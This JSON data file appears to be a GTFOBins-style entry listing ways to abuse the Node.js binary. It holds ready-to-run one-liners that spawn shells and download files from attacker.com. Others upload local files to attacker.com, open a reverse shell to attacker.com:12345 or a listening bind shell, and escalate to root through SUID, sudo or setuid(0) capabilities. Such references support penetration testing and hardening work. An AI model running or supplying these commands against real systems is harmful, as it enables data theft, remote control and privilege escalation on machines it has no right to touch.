{
  "functions": {
    "shell": [
      {
        "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
      }
    ],
    "file-write": [
      {
        "code": "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'"
      }
    ],
    "file-read": [
      {
        "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'"
      }
    ],
    "file-download": [
      {
        "description": "Fetch a remote file via HTTP GET request.",
        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'\n"
      }
    ],
    "file-upload": [
      {
        "description": "Send a local file via HTTP POST request.",
        "code": "export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'\n"
      }
    ],
    "reverse-shell": [
      {
        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
        "code": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'\n"
      }
    ],
    "bind-shell": [
      {
        "description": "Run `nc target.com 12345` on the attacker box to connect to the shell.",
        "code": "export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'\n"
      }
    ],
    "suid": [
      {
        "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
      }
    ],
    "sudo": [
      {
        "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
      }
    ],
    "capabilities": [
      {
        "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
      }
    ]
  }
}
